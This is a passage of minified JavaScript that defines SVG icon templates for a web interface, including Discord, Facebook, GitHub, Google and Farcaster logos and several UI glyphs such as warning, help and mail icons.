        fill-rule="evenodd"
        d="M25.71 28.15C30.25 28 32 25.02 32 25.02c0-6.61-2.96-11.98-2.96-11.98-2.96-2.22-5.77-2.15-5.77-2.15l-.29.32c3.5 1.07 5.12 2.61 5.12 2.61a16.75 16.75 0 0 0-10.34-1.93l-.35.04a15.43 15.43 0 0 0-5.88 1.9s1.71-1.63 5.4-2.7l-.2-.24s-2.81-.07-5.77 2.15c0 0-2.96 5.37-2.96 11.98 0 0 1.73 2.98 6.27 3.13l1.37-1.7c-2.6-.79-3.6-2.43-3.6-2.43l.58.35.09.06.08.04.02.01.08.05a17.25 17.25 0 0 0 4.52 1.58 14.4 14.4 0 0 0 8.3-.86c.72-.27 1.52-.66 2.37-1.21 0 0-1.03 1.68-3.72 2.44.61.78 1.35 1.67 1.35 1.67Zm-9.55-9.6c-1.17 0-2.1 1.03-2.1 2.28 0 1.25.95 2.28 2.1 2.28 1.17 0 2.1-1.03 2.1-2.28.01-1.25-.93-2.28-2.1-2.28Zm7.5 0c-1.17 0-2.1 1.03-2.1 2.28 0 1.25.95 2.28 2.1 2.28 1.17 0 2.1-1.03 2.1-2.28 0-1.25-.93-2.28-2.1-2.28Z"
        clip-rule="evenodd"
      />
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
  </defs>
</svg>`,qNe=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    d="M4.25 7a.63.63 0 0 0-.63.63v3.97c0 .28-.2.51-.47.54l-.75.07a.93.93 0 0 1-.9-.47A7.51 7.51 0 0 1 5.54.92a7.5 7.5 0 0 1 9.54 4.62c.12.35.06.72-.16 1-.74.97-1.68 1.78-2.6 2.44V4.44a.64.64 0 0 0-.63-.64h-1.06c-.35 0-.63.3-.63.64v5.5c0 .23-.12.42-.32.5l-.52.23V6.05c0-.36-.3-.64-.64-.64H7.45c-.35 0-.64.3-.64.64v4.97c0 .25-.17.46-.4.52a5.8 5.8 0 0 0-.45.11v-4c0-.36-.3-.65-.64-.65H4.25ZM14.07 12.4A7.49 7.49 0 0 1 3.6 14.08c4.09-.58 9.14-2.5 11.87-6.6v.03a7.56 7.56 0 0 1-1.41 4.91Z"
  />
</svg>`,zNe=xe`<svg width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M15.0162 11.6312L9.55059 2.13937C9.39228 1.86862 9.16584 1.64405 8.8938 1.48798C8.62176 1.33192 8.3136 1.2498 7.99997 1.2498C7.68634 1.2498 7.37817 1.33192 7.10613 1.48798C6.83409 1.64405 6.60765 1.86862 6.44934 2.13937L0.983716 11.6312C0.830104 11.894 0.749146 12.1928 0.749146 12.4972C0.749146 12.8015 0.830104 13.1004 0.983716 13.3631C1.14027 13.6352 1.3664 13.8608 1.63889 14.0166C1.91139 14.1725 2.22044 14.253 2.53434 14.25H13.4656C13.7793 14.2528 14.0881 14.1721 14.3603 14.0163C14.6326 13.8604 14.8585 13.635 15.015 13.3631C15.1688 13.1005 15.2499 12.8017 15.2502 12.4973C15.2504 12.193 15.1696 11.8941 15.0162 11.6312ZM13.7162 12.6125C13.6908 12.6558 13.6541 12.6914 13.6101 12.7157C13.5661 12.7399 13.5164 12.7517 13.4662 12.75H2.53434C2.48415 12.7517 2.43442 12.7399 2.39042 12.7157C2.34641 12.6914 2.30976 12.6558 2.28434 12.6125C2.26278 12.5774 2.25137 12.5371 2.25137 12.4959C2.25137 12.4548 2.26278 12.4144 2.28434 12.3794L7.74997 2.88749C7.77703 2.84583 7.81408 2.8116 7.85774 2.7879C7.9014 2.7642 7.95029 2.75178 7.99997 2.75178C8.04964 2.75178 8.09854 2.7642 8.1422 2.7879C8.18586 2.8116 8.2229 2.84583 8.24997 2.88749L13.715 12.3794C13.7367 12.4143 13.7483 12.4546 13.7486 12.4958C13.7488 12.5369 13.7376 12.5773 13.7162 12.6125ZM7.24997 8.49999V6.49999C7.24997 6.30108 7.32898 6.11031 7.46964 5.96966C7.61029 5.82901 7.80105 5.74999 7.99997 5.74999C8.19888 5.74999 8.38964 5.82901 8.5303 5.96966C8.67095 6.11031 8.74997 6.30108 8.74997 6.49999V8.49999C8.74997 8.6989 8.67095 8.88967 8.5303 9.03032C8.38964 9.17097 8.19888 9.24999 7.99997 9.24999C7.80105 9.24999 7.61029 9.17097 7.46964 9.03032C7.32898 8.88967 7.24997 8.6989 7.24997 8.49999ZM8.99997 11C8.99997 11.1978 8.94132 11.3911 8.83144 11.5556C8.72155 11.72 8.56538 11.8482 8.38265 11.9239C8.19992 11.9996 7.99886 12.0194 7.80488 11.9808C7.6109 11.9422 7.43271 11.847 7.29286 11.7071C7.15301 11.5672 7.05777 11.3891 7.01918 11.1951C6.9806 11.0011 7.0004 10.8 7.07609 10.6173C7.15177 10.4346 7.27995 10.2784 7.4444 10.1685C7.60885 10.0586 7.80219 9.99999 7.99997 9.99999C8.26518 9.99999 8.51954 10.1053 8.70707 10.2929C8.89461 10.4804 8.99997 10.7348 8.99997 11Z" fill="currentColor"/>
</svg>
`,WNe=xe`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.71 2.99a.57.57 0 0 0-.57.57 1 1 0 0 1-1 1c-.58 0-.96 0-1.24.03-.27.03-.37.07-.42.1a.97.97 0 0 0-.36.35c-.04.08-.09.21-.11.67a2.57 2.57 0 0 1 0 5.13c.02.45.07.6.11.66.09.15.21.28.36.36.07.04.21.1.67.12a2.57 2.57 0 0 1 5.12 0c.46-.03.6-.08.67-.12a.97.97 0 0 0 .36-.36c.03-.04.07-.14.1-.41.02-.29.03-.66.03-1.24a1 1 0 0 1 1-1 .57.57 0 0 0 0-1.15 1 1 0 0 1-1-1c0-.58 0-.95-.03-1.24a1.04 1.04 0 0 0-.1-.42.97.97 0 0 0-.36-.36 1.04 1.04 0 0 0-.42-.1c-.28-.02-.65-.02-1.24-.02a1 1 0 0 1-1-1 .57.57 0 0 0-.57-.57ZM5.15 13.98a1 1 0 0 0 .99-1v-.78a.57.57 0 0 1 1.14 0v.78a1 1 0 0 0 .99 1H8.36a66.26 66.26 0 0 0 .73 0 3.78 3.78 0 0 0 1.84-.38c.46-.26.85-.64 1.1-1.1.23-.4.32-.8.36-1.22.02-.2.03-.4.03-.63a2.57 2.57 0 0 0 0-4.75c0-.23-.01-.44-.03-.63a2.96 2.96 0 0 0-.35-1.22 2.97 2.97 0 0 0-1.1-1.1c-.4-.22-.8-.31-1.22-.35a8.7 8.7 0 0 0-.64-.04 2.57 2.57 0 0 0-4.74 0c-.23 0-.44.02-.63.04-.42.04-.83.13-1.22.35-.46.26-.84.64-1.1 1.1-.33.57-.37 1.2-.39 1.84a21.39 21.39 0 0 0 0 .72v.1a1 1 0 0 0 1 .99h.78a.57.57 0 0 1 0 1.15h-.77a1 1 0 0 0-1 .98v.1a63.87 63.87 0 0 0 0 .73c0 .64.05 1.27.38 1.83.26.47.64.85 1.1 1.11.56.32 1.2.37 1.84.38a20.93 20.93 0 0 0 .72 0h.1Z"
    clip-rule="evenodd"
  />
</svg>`,HNe=xe`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3.74 3.99a1 1 0 0 1 1-1H11a1 1 0 0 1 1 1v6.26a1 1 0 0 1-2 0V6.4l-6.3 6.3a1 1 0 0 1-1.4-1.42l6.29-6.3H4.74a1 1 0 0 1-1-1Z"
    clip-rule="evenodd"
  />
</svg>`,VNe=xe`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#1877F2" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M26 12.38h-2.89c-.92 0-1.61.38-1.61 1.34v1.66H26l-.36 4.5H21.5v12H17v-12h-3v-4.5h3V12.5c0-3.03 1.6-4.62 5.2-4.62H26v4.5Z"
        />
      </g>
    </g>
    <path
      fill="#1877F2"
      d="M40 20a20 20 0 1 0-23.13 19.76V25.78H11.8V20h5.07v-4.4c0-5.02 3-7.79 7.56-7.79 2.19 0 4.48.4 4.48.4v4.91h-2.53c-2.48 0-3.25 1.55-3.25 3.13V20h5.54l-.88 5.78h-4.66v13.98A20 20 0 0 0 40 20Z"
    />
    <path
      fill="#fff"
      d="m27.79 25.78.88-5.78h-5.55v-3.75c0-1.58.78-3.13 3.26-3.13h2.53V8.2s-2.3-.39-4.48-.39c-4.57 0-7.55 2.77-7.55 7.78V20H11.8v5.78h5.07v13.98a20.15 20.15 0 0 0 6.25 0V25.78h4.67Z"
    />
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,KNe=xe`<svg style="border-radius: 9999px; overflow: hidden;"  fill="none" viewBox="0 0 1000 1000">
  <rect width="1000" height="1000" rx="9999" ry="9999" fill="#855DCD"/>
  <path fill="#855DCD" d="M0 0h1000v1000H0V0Z" />
  <path
    fill="#fff"
    d="M320 248h354v504h-51.96V521.13h-.5c-5.76-63.8-59.31-113.81-124.54-113.81s-118.78 50-124.53 113.81h-.5V752H320V248Z"
  />
  <path
    fill="#fff"
    d="m225 320 21.16 71.46h17.9v289.09a16.29 16.29 0 0 0-16.28 16.24v19.49h-3.25a16.3 16.3 0 0 0-16.28 16.24V752h182.26v-19.48a16.22 16.22 0 0 0-16.28-16.24h-3.25v-19.5a16.22 16.22 0 0 0-16.28-16.23h-19.52V320H225Zm400.3 360.55a16.3 16.3 0 0 0-15.04 10.02 16.2 16.2 0 0 0-1.24 6.22v19.49h-3.25a16.29 16.29 0 0 0-16.27 16.24V752h182.24v-19.48a16.23 16.23 0 0 0-16.27-16.24h-3.25v-19.5a16.2 16.2 0 0 0-10.04-15 16.3 16.3 0 0 0-6.23-1.23v-289.1h17.9L775 320H644.82v360.55H625.3Z"
  />
</svg>`,GNe=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M0 3a1 1 0 0 1 1-1h14a1 1 0 1 1 0 2H1a1 1 0 0 1-1-1Zm2.63 5.25a1 1 0 0 1 1-1h8.75a1 1 0 1 1 0 2H3.63a1 1 0 0 1-1-1Zm2.62 5.25a1 1 0 0 1 1-1h3.5a1 1 0 0 1 0 2h-3.5a1 1 0 0 1-1-1Z"
    clip-rule="evenodd"
  />
</svg>`,ZNe=xe`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#1B1F23" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M8 19.89a12 12 0 1 1 15.8 11.38c-.6.12-.8-.26-.8-.57v-3.3c0-1.12-.4-1.85-.82-2.22 2.67-.3 5.48-1.31 5.48-5.92 0-1.31-.47-2.38-1.24-3.22.13-.3.54-1.52-.12-3.18 0 0-1-.32-3.3 1.23a11.54 11.54 0 0 0-6 0c-2.3-1.55-3.3-1.23-3.3-1.23a4.32 4.32 0 0 0-.12 3.18 4.64 4.64 0 0 0-1.24 3.22c0 4.6 2.8 5.63 5.47 5.93-.34.3-.65.83-.76 1.6-.69.31-2.42.84-3.5-1 0 0-.63-1.15-1.83-1.23 0 0-1.18-.02-.09.73 0 0 .8.37 1.34 1.76 0 0 .7 2.14 4.03 1.41v2.24c0 .31-.2.68-.8.57A12 12 0 0 1 8 19.9Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,YNe=xe`<svg fill="none" viewBox="0 0 40 40">
  <path
    fill="#4285F4"
    d="M32.74 20.3c0-.93-.08-1.81-.24-2.66H20.26v5.03h7a6 6 0 0 1-2.62 3.91v3.28h4.22c2.46-2.27 3.88-5.6 3.88-9.56Z"
  />
  <path
    fill="#34A853"
    d="M20.26 33a12.4 12.4 0 0 0 8.6-3.14l-4.22-3.28a7.74 7.74 0 0 1-4.38 1.26 7.76 7.76 0 0 1-7.28-5.36H8.65v3.36A12.99 12.99 0 0 0 20.26 33Z"
  />
  <path
    fill="#FBBC05"
    d="M12.98 22.47a7.79 7.79 0 0 1 0-4.94v-3.36H8.65a12.84 12.84 0 0 0 0 11.66l3.37-2.63.96-.73Z"
  />
  <path
    fill="#EA4335"
    d="M20.26 12.18a7.1 7.1 0 0 1 4.98 1.93l3.72-3.72A12.47 12.47 0 0 0 20.26 7c-5.08 0-9.47 2.92-11.6 7.17l4.32 3.36a7.76 7.76 0 0 1 7.28-5.35Z"
  />
</svg>`,JNe=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    d="M8.51 5.66a.83.83 0 0 0-.57-.2.83.83 0 0 0-.52.28.8.8 0 0 0-.25.52 1 1 0 0 1-2 0c0-.75.34-1.43.81-1.91a2.75 2.75 0 0 1 4.78 1.92c0 1.24-.8 1.86-1.25 2.2l-.04.03c-.47.36-.5.43-.5.65a1 1 0 1 1-2 0c0-1.25.8-1.86 1.24-2.2l.04-.04c.47-.36.5-.43.5-.65 0-.3-.1-.49-.24-.6ZM9.12 11.87a1.13 1.13 0 1 1-2.25 0 1.13 1.13 0 0 1 2.25 0Z"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6a6 6 0 1 0 0 12A6 6 0 0 0 8 2Z"
    clip-rule="evenodd"
  />
</svg>`,QNe=xe`<svg
 xmlns="http://www.w3.org/2000/svg"
 width="28"
 height="28"
 viewBox="0 0 28 28"
 fill="none">
  <path
    fill="#949E9E"
    fill-rule="evenodd"
    d="M7.974 2.975h12.052c1.248 0 2.296 0 3.143.092.89.096 1.723.307 2.461.844a4.9 4.9 0 0 1 1.084 1.084c.537.738.748 1.57.844 2.461.092.847.092 1.895.092 3.143v6.802c0 1.248 0 2.296-.092 3.143-.096.89-.307 1.723-.844 2.461a4.9 4.9 0 0 1-1.084 1.084c-.738.537-1.57.748-2.461.844-.847.092-1.895.092-3.143.092H7.974c-1.247 0-2.296 0-3.143-.092-.89-.096-1.723-.307-2.461-.844a4.901 4.901 0 0 1-1.084-1.084c-.537-.738-.748-1.571-.844-2.461C.35 19.697.35 18.649.35 17.4v-6.802c0-1.248 0-2.296.092-3.143.096-.89.307-1.723.844-2.461A4.9 4.9 0 0 1 2.37 3.91c.738-.537 1.571-.748 2.461-.844.847-.092 1.895-.092 3.143-.092ZM5.133 5.85c-.652.071-.936.194-1.117.326a2.1 2.1 0 0 0-.465.465c-.132.181-.255.465-.325 1.117-.074.678-.076 1.573-.076 2.917v6.65c0 1.344.002 2.239.076 2.917.07.652.193.936.325 1.117a2.1 2.1 0 0 0 .465.465c.181.132.465.255 1.117.326.678.073 1.574.075 2.917.075h11.9c1.344 0 2.239-.002 2.917-.075.652-.071.936-.194 1.117-.326.179-.13.335-.286.465-.465.132-.181.255-.465.326-1.117.073-.678.075-1.573.075-2.917v-6.65c0-1.344-.002-2.239-.075-2.917-.071-.652-.194-.936-.326-1.117a2.1 2.1 0 0 0-.465-.465c-.181-.132-.465-.255-1.117-.326-.678-.073-1.573-.075-2.917-.075H8.05c-1.343 0-2.239.002-2.917.075Zm.467 7.275a3.15 3.15 0 1 1 6.3 0 3.15 3.15 0 0 1-6.3 0Zm8.75-1.75a1.4 1.4 0 0 1 1.4-1.4h3.5a1.4 1.4 0 0 1 0 2.8h-3.5a1.4 1.4 0 0 1-1.4-1.4Zm0 5.25a1.4 1.4 0 0 1 1.4-1.4H21a1.4 1.4 0 1 1 0 2.8h-5.25a1.4 1.4 0 0 1-1.4-1.4Z"
    clip-rule="evenodd"/>
</svg>`,XNe=xe`<svg width="14" height="14" viewBox="0 0 14 14" fill="none">
  <path d="M4.98926 3.73932C4.2989 3.73932 3.73926 4.29896 3.73926 4.98932C3.73926 5.67968 4.2989 6.23932 4.98926 6.23932C5.67962 6.23932 6.23926 5.67968 6.23926 4.98932C6.23926 4.29896 5.67962 3.73932 4.98926 3.73932Z" fill="currentColor"/>
  <path fill-rule="evenodd" clip-rule="evenodd" d="M7.60497 0.500001H6.39504C5.41068 0.499977 4.59185 0.499958 3.93178 0.571471C3.24075 0.64634 2.60613 0.809093 2.04581 1.21619C1.72745 1.44749 1.44749 1.72745 1.21619 2.04581C0.809093 2.60613 0.64634 3.24075 0.571471 3.93178C0.499958 4.59185 0.499977 5.41065 0.500001 6.39501V7.57815C0.499998 8.37476 0.499995 9.05726 0.534869 9.62725C0.570123 10.2034 0.644114 10.7419 0.828442 11.2302C0.925651 11.4877 1.05235 11.7287 1.21619 11.9542C1.44749 12.2726 1.72745 12.5525 2.04581 12.7838C2.60613 13.1909 3.24075 13.3537 3.93178 13.4285C4.59185 13.5001 5.41066 13.5 6.39503 13.5H7.60496C8.58933 13.5 9.40815 13.5001 10.0682 13.4285C10.7593 13.3537 11.3939 13.1909 11.9542 12.7838C12.2726 12.5525 12.5525 12.2726 12.7838 11.9542C13.1909 11.3939 13.3537 10.7593 13.4285 10.0682C13.5 9.40816 13.5 8.58935 13.5 7.60497V6.39505C13.5 5.41068 13.5 4.59185 13.4285 3.93178C13.3537 3.24075 13.1909 2.60613 12.7838 2.04581C12.5525 1.72745 12.2726 1.44749 11.9542 1.21619C11.3939 0.809093 10.7593 0.64634 10.0682 0.571471C9.40816 0.499958 8.58933 0.499977 7.60497 0.500001ZM3.22138 2.83422C3.38394 2.71612 3.62634 2.61627 4.14721 2.55984C4.68679 2.50138 5.39655 2.5 6.45 2.5H7.55C8.60345 2.5 9.31322 2.50138 9.8528 2.55984C10.3737 2.61627 10.6161 2.71612 10.7786 2.83422C10.9272 2.94216 11.0578 3.07281 11.1658 3.22138C11.2839 3.38394 11.3837 3.62634 11.4402 4.14721C11.4986 4.68679 11.5 5.39655 11.5 6.45V6.49703C10.9674 6.11617 10.386 5.84936 9.74213 5.81948C8.40536 5.75745 7.3556 6.73051 6.40509 7.84229C6.33236 7.92737 6.27406 7.98735 6.22971 8.02911L6.1919 8.00514L6.17483 7.99427C6.09523 7.94353 5.98115 7.87083 5.85596 7.80302C5.56887 7.64752 5.18012 7.4921 4.68105 7.4921C4.66697 7.4921 4.6529 7.49239 4.63884 7.49299C3.79163 7.52878 3.09922 8.1106 2.62901 8.55472C2.58751 8.59392 2.54594 8.6339 2.50435 8.6745C2.50011 8.34653 2.5 7.97569 2.5 7.55V6.45C2.5 5.39655 2.50138 4.68679 2.55984 4.14721C2.61627 3.62634 2.71612 3.38394 2.83422 3.22138C2.94216 3.07281 3.07281 2.94216 3.22138 2.83422ZM10.3703 8.14825C10.6798 8.37526 11.043 8.71839 11.4832 9.20889C11.4744 9.44992 11.4608 9.662 11.4402 9.8528C11.3837 10.3737 11.2839 10.6161 11.1658 10.7786C11.0578 10.9272 10.9272 11.0578 10.7786 11.1658C10.6161 11.2839 10.3737 11.3837 9.8528 11.4402C9.31322 11.4986 8.60345 11.5 7.55 11.5H6.45C5.39655 11.5 4.68679 11.4986 4.14721 11.4402C3.62634 11.3837 3.38394 11.2839 3.22138 11.1658C3.15484 11.1174 3.0919 11.0645 3.03298 11.0075C3.10126 10.9356 3.16806 10.8649 3.23317 10.7959L3.29772 10.7276C3.55763 10.4525 3.78639 10.2126 4.00232 10.0087C4.22016 9.80294 4.39412 9.66364 4.53524 9.57742C4.63352 9.51738 4.69022 9.49897 4.71275 9.49345C4.76387 9.49804 4.81803 9.51537 4.90343 9.56162C4.96409 9.59447 5.02355 9.63225 5.11802 9.69238L5.12363 9.69595C5.20522 9.74789 5.32771 9.82587 5.46078 9.89278C5.76529 10.0459 6.21427 10.186 6.74977 10.0158C7.21485 9.86796 7.59367 9.52979 7.92525 9.14195C8.91377 7.98571 9.38267 7.80495 9.64941 7.81733C9.7858 7.82366 10.0101 7.884 10.3703 8.14825Z" fill="currentColor"/>
</svg>`,ePe=xe`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    d="M6 10.49a1 1 0 1 0 2 0v-2a1 1 0 0 0-2 0v2ZM7 4.49a1 1 0 1 0 0 2 1 1 0 0 0 0-2Z"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M7 14.99a7 7 0 1 0 0-14 7 7 0 0 0 0 14Zm5-7a5 5 0 1 1-10 0 5 5 0 0 1 10 0Z"
    clip-rule="evenodd"
  />
</svg>`,tPe=xe`<svg width="22" height="22" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M9.125 6.875C9.125 6.57833 9.21298 6.28832 9.3778 6.04165C9.54262 5.79497 9.77689 5.60271 10.051 5.48918C10.3251 5.37565 10.6267 5.34594 10.9176 5.40382C11.2086 5.4617 11.4759 5.60456 11.6857 5.81434C11.8954 6.02412 12.0383 6.29139 12.0962 6.58236C12.1541 6.87334 12.1244 7.17494 12.0108 7.44903C11.8973 7.72311 11.705 7.95738 11.4584 8.1222C11.2117 8.28703 10.9217 8.375 10.625 8.375C10.2272 8.375 9.84565 8.21696 9.56434 7.93566C9.28304 7.65436 9.125 7.27282 9.125 6.875ZM21.125 11C21.125 13.0025 20.5312 14.9601 19.4186 16.6251C18.3061 18.2902 16.7248 19.5879 14.8747 20.3543C13.0246 21.1206 10.9888 21.3211 9.02471 20.9305C7.06066 20.5398 5.25656 19.5755 3.84055 18.1595C2.42454 16.7435 1.46023 14.9393 1.06955 12.9753C0.678878 11.0112 0.879387 8.97543 1.64572 7.12533C2.41206 5.27523 3.70981 3.69392 5.37486 2.58137C7.0399 1.46882 8.99747 0.875 11 0.875C13.6844 0.877978 16.258 1.94567 18.1562 3.84383C20.0543 5.74199 21.122 8.3156 21.125 11ZM18.875 11C18.875 9.44247 18.4131 7.91992 17.5478 6.62488C16.6825 5.32985 15.4526 4.32049 14.0136 3.72445C12.5747 3.12841 10.9913 2.97246 9.46367 3.27632C7.93607 3.58017 6.53288 4.3302 5.43154 5.43153C4.3302 6.53287 3.58018 7.93606 3.27632 9.46366C2.97246 10.9913 3.12841 12.5747 3.72445 14.0136C4.32049 15.4526 5.32985 16.6825 6.62489 17.5478C7.91993 18.4131 9.44248 18.875 11 18.875C13.0879 18.8728 15.0896 18.0424 16.566 16.566C18.0424 15.0896 18.8728 13.0879 18.875 11ZM12.125 14.4387V11.375C12.125 10.8777 11.9275 10.4008 11.5758 10.0492C11.2242 9.69754 10.7473 9.5 10.25 9.5C9.98433 9.4996 9.72708 9.59325 9.52383 9.76435C9.32058 9.93544 9.18444 10.173 9.13952 10.4348C9.09461 10.6967 9.14381 10.966 9.27843 11.195C9.41304 11.4241 9.62438 11.5981 9.875 11.6863V14.75C9.875 15.2473 10.0725 15.7242 10.4242 16.0758C10.7758 16.4275 11.2527 16.625 11.75 16.625C12.0157 16.6254 12.2729 16.5318 12.4762 16.3607C12.6794 16.1896 12.8156 15.952 12.8605 15.6902C12.9054 15.4283 12.8562 15.159 12.7216 14.93C12.587 14.7009 12.3756 14.5269 12.125 14.4387Z" fill="currentColor"/>
</svg>`,rPe=xe`<svg width="10" height="10" viewBox="0 0 10 10" fill="none" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" clip-rule="evenodd" d="M5.00177 1.78569C3.8179 1.78569 2.85819 2.74508 2.85819 3.92855C2.85819 4.52287 3.09928 5.05956 3.49077 5.4485L3.5005 5.45817C3.64381 5.60054 3.76515 5.72108 3.85631 5.81845C3.93747 5.90512 4.05255 6.03218 4.12889 6.1805C4.16999 6.26034 4.19 6.30843 4.21768 6.39385C4.22145 6.40546 4.22499 6.41703 4.22833 6.42855H5.77521C5.77854 6.41703 5.78208 6.40547 5.78585 6.39385C5.81353 6.30843 5.83354 6.26034 5.87464 6.1805C5.95098 6.03218 6.06606 5.90512 6.14722 5.81845C6.23839 5.72108 6.35973 5.60053 6.50304 5.45816L6.51276 5.4485C6.90425 5.05956 7.14534 4.52287 7.14534 3.92855C7.14534 2.74508 6.18563 1.78569 5.00177 1.78569ZM5.71629 7.85712H4.28724C4.28724 8.21403 4.28876 8.40985 4.30703 8.54571C4.30727 8.54748 4.30751 8.54921 4.30774 8.55091C4.30944 8.55115 4.31118 8.55138 4.31295 8.55162C4.44884 8.56989 4.64474 8.5714 5.00177 8.5714C5.3588 8.5714 5.55469 8.56989 5.69059 8.55162C5.69236 8.55138 5.69409 8.55115 5.69579 8.55091C5.69603 8.54921 5.69627 8.54748 5.6965 8.54571C5.71477 8.40985 5.71629 8.21403 5.71629 7.85712ZM2.85819 7.14283C2.85819 6.9948 2.85796 6.91114 2.8548 6.85032C2.85461 6.84656 2.85441 6.84309 2.85421 6.83988C2.84393 6.8282 2.83047 6.81334 2.81301 6.79469C2.74172 6.71856 2.63908 6.61643 2.48342 6.46178C1.83307 5.81566 1.42914 4.91859 1.42914 3.92855C1.42914 1.9561 3.02866 0.357117 5.00177 0.357117C6.97487 0.357117 8.57439 1.9561 8.57439 3.92855C8.57439 4.91859 8.17047 5.81566 7.52012 6.46178C7.36445 6.61643 7.26182 6.71856 7.19053 6.79469C7.17306 6.81334 7.1596 6.8282 7.14932 6.83988C7.14912 6.84309 7.14892 6.84656 7.14873 6.85032C7.14557 6.91114 7.14534 6.9948 7.14534 7.14283V7.85712C7.14534 7.87009 7.14535 7.88304 7.14535 7.89598C7.14541 8.19889 7.14547 8.49326 7.11281 8.73606C7.076 9.00978 6.98631 9.32212 6.72678 9.58156C6.46726 9.841 6.15481 9.93065 5.881 9.96745C5.63813 10.0001 5.34365 10 5.04064 9.99998C5.0277 9.99998 5.01474 9.99998 5.00177 9.99998C4.98879 9.99998 4.97583 9.99998 4.96289 9.99998C4.65988 10 4.36541 10.0001 4.12253 9.96745C3.84872 9.93065 3.53628 9.841 3.27675 9.58156C3.01722 9.32212 2.92753 9.00978 2.89072 8.73606C2.85807 8.49326 2.85812 8.19889 2.85818 7.89598C2.85819 7.88304 2.85819 7.87008 2.85819 7.85712V7.14283ZM7.1243 6.86977C7.12366 6.87069 7.1233 6.87116 7.12327 6.87119C7.12323 6.87123 7.12356 6.87076 7.1243 6.86977ZM2.88027 6.8712C2.88025 6.87119 2.87988 6.8707 2.87921 6.86975C2.87995 6.87072 2.88028 6.8712 2.88027 6.8712Z" fill="#949E9E"/>
</svg>`,iPe=xe`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4.83 1.34h6.34c.68 0 1.26 0 1.73.04.5.05.97.15 1.42.4.52.3.95.72 1.24 1.24.26.45.35.92.4 1.42.04.47.04 1.05.04 1.73v3.71c0 .69 0 1.26-.04 1.74-.05.5-.14.97-.4 1.41-.3.52-.72.95-1.24 1.25-.45.25-.92.35-1.42.4-.47.03-1.05.03-1.73.03H4.83c-.68 0-1.26 0-1.73-.04-.5-.04-.97-.14-1.42-.4-.52-.29-.95-.72-1.24-1.24a3.39 3.39 0 0 1-.4-1.41A20.9 20.9 0 0 1 0 9.88v-3.7c0-.7 0-1.27.04-1.74.05-.5.14-.97.4-1.42.3-.52.72-.95 1.24-1.24.45-.25.92-.35 1.42-.4.47-.04 1.05-.04 1.73-.04ZM3.28 3.38c-.36.03-.51.08-.6.14-.21.11-.39.29-.5.5a.8.8 0 0 0-.08.19l5.16 3.44c.45.3 1.03.3 1.48 0L13.9 4.2a.79.79 0 0 0-.08-.2c-.11-.2-.29-.38-.5-.5-.09-.05-.24-.1-.6-.13-.37-.04-.86-.04-1.6-.04H4.88c-.73 0-1.22 0-1.6.04ZM14 6.54 9.85 9.31a3.33 3.33 0 0 1-3.7 0L2 6.54v3.3c0 .74 0 1.22.03 1.6.04.36.1.5.15.6.11.2.29.38.5.5.09.05.24.1.6.14.37.03.86.03 1.6.03h6.25c.73 0 1.22 0 1.6-.03.35-.03.5-.09.6-.14.2-.12.38-.3.5-.5.05-.1.1-.24.14-.6.03-.38.03-.86.03-1.6v-3.3Z"
    clip-rule="evenodd"
  />
</svg>`,nPe=xe`<svg fill="none" viewBox="0 0 20 20">
  <path fill="currentColor" d="M10.81 5.81a2 2 0 1 1-4 0 2 2 0 0 1 4 0Z" />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M3 4.75A4.75 4.75 0 0 1 7.75 0h4.5A4.75 4.75 0 0 1 17 4.75v10.5A4.75 4.75 0 0 1 12.25 20h-4.5A4.75 4.75 0 0 1 3 15.25V4.75ZM7.75 2A2.75 2.75 0 0 0 5 4.75v10.5A2.75 2.75 0 0 0 7.75 18h4.5A2.75 2.75 0 0 0 15 15.25V4.75A2.75 2.75 0 0 0 12.25 2h-4.5Z"
    clip-rule="evenodd"
  />
</svg>`,sPe=xe`<svg fill="none" viewBox="0 0 41 40">
  <path
    style="fill: var(--wui-color-fg-100);"
    fill-opacity=".05"
    d="M.6 20a20 20 0 1 1 40 0 20 20 0 0 1-40 0Z"
  />
  <path
    fill="#949E9E"
    d="M15.6 20.31a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0ZM23.1 20.31a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0ZM28.1 22.81a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5Z"
  />
</svg>`,oPe=xe`<svg fill="none" viewBox="0 0 22 20">
